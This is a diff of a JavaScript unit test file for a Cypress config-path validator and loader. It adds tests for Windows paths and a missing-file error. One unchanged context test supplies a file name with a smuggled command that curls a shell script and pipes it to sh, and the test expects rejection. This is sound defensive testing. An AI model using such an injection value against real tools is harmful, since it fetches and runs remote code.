@@ -49,6 +49,22 @@ describe("readCypressConfigUtil", () => {
             expect(() => readCypressConfigUtil.validateFilePath('path/to my project/cypress.config.js')).to.not.throw();
         });
 
+        it('should accept Windows absolute paths with backslashes', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('C:\\Users\\test\\cypress.config.js')).to.not.throw();
+        });
+
+        it('should accept Windows absolute paths with spaces and backslashes (Program Files)', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('C:\\Program Files\\my app\\cypress.config.js')).to.not.throw();
+        });
+
+        it('should accept Windows relative paths with backslashes', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('.\\subdir\\cypress.config.js')).to.not.throw();
+        });
+
+        it('should accept UNC-style Windows paths', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('\\\\server\\share\\cypress.config.js')).to.not.throw();
+        });
+
         it('should reject paths with semicolons (command injection)', () => {
             expect(() => readCypressConfigUtil.validateFilePath('cypress.config";curl localhost:8000/shell.sh|sh;".js'))
                 .to.throw(/disallowed characters/);
@@ -82,9 +98,9 @@ describe("readCypressConfigUtil", () => {
             const existsSyncStub = sandbox.stub(fs, 'existsSync').returns(true);
             const unlinkSyncSyncStub = sandbox.stub(fs, 'unlinkSync');
             const requireModulePath = path.join(__dirname, '../../../../', 'bin', 'helpers', 'requireModule.js');
-            
+
             const result =  readCypressConfigUtil.loadJsFile('path/to/cypress.config.ts', 'path/to/tmpBstackPackages');
-            
+
             expect(result).to.eql({ e2e: {} });
             // Verify execFileSync is called with 'node' as first arg and array of args
             sinon.assert.calledOnce(execFileStub);
@@ -94,7 +110,8 @@ describe("readCypressConfigUtil", () => {
             expect(execFileStub.getCall(0).args[2].env.NODE_PATH).to.eql('path/to/tmpBstackPackages');
             sinon.assert.calledOnce(readFileSyncStub);
             sinon.assert.calledOnce(unlinkSyncSyncStub);
-            sinon.assert.calledOnce(existsSyncStub);
+            // existsSync is now called twice: once for the file-not-found UX check, once for the unlink cleanup
+            sinon.assert.calledTwice(existsSyncStub);
         });
 
         it('should load js file using execFileSync on Windows too (no platform-specific branching needed)', () => {
@@ -115,7 +132,33 @@ describe("readCypressConfigUtil", () => {
             expect(execFileStub.getCall(0).args[2].env.NODE_PATH).to.eql('path/to/tmpBstackPackages');
             sinon.assert.calledOnce(readFileSyncStub);
             sinon.assert.calledOnce(unlinkSyncSyncStub);
-            sinon.assert.calledOnce(existsSyncStub);
+            // existsSync called twice: file-not-found UX check + unlink cleanup
+            sinon.assert.calledTwice(existsSyncStub);
+        });
+
+        it('should accept Windows-style absolute paths in loadJsFile (no rejection)', () => {
+            sandbox.stub(cp, "execFileSync").returns("random string");
+            sandbox.stub(fs, 'readFileSync').returns('{"e2e": {}}');
+            sandbox.stub(fs, 'existsSync').returns(true);
+            sandbox.stub(fs, 'unlinkSync');
+
+            // None of these should throw
+            expect(() => readCypressConfigUtil.loadJsFile('C:\\Users\\test\\cypress.config.js', 'path/to/tmpBstackPackages'))
+                .to.not.throw();
+            expect(() => readCypressConfigUtil.loadJsFile('C:\\Program Files\\my app\\cypress.config.js', 'path/to/tmpBstackPackages'))
+                .to.not.throw();
+            expect(() => readCypressConfigUtil.loadJsFile('.\\subdir\\cypress.config.js', 'path/to/tmpBstackPackages'))
+                .to.not.throw();
+        });
+
+        it('should throw a clear error when the cypress config file does not exist (UX)', () => {
+            sandbox.stub(fs, 'existsSync').returns(false);
+            const execFileStub = sandbox.stub(cp, "execFileSync");
+
+            expect(() => readCypressConfigUtil.loadJsFile('path/to/missing/cypress.config.js', 'path/to/tmpBstackPackages'))
+                .to.throw(/Cypress config file not found at:/);
+            // execFileSync must NOT be invoked when the file is missing
+            sinon.assert.notCalled(execFileStub);
         });
 
         it('should reject file paths containing command injection characters', () => {
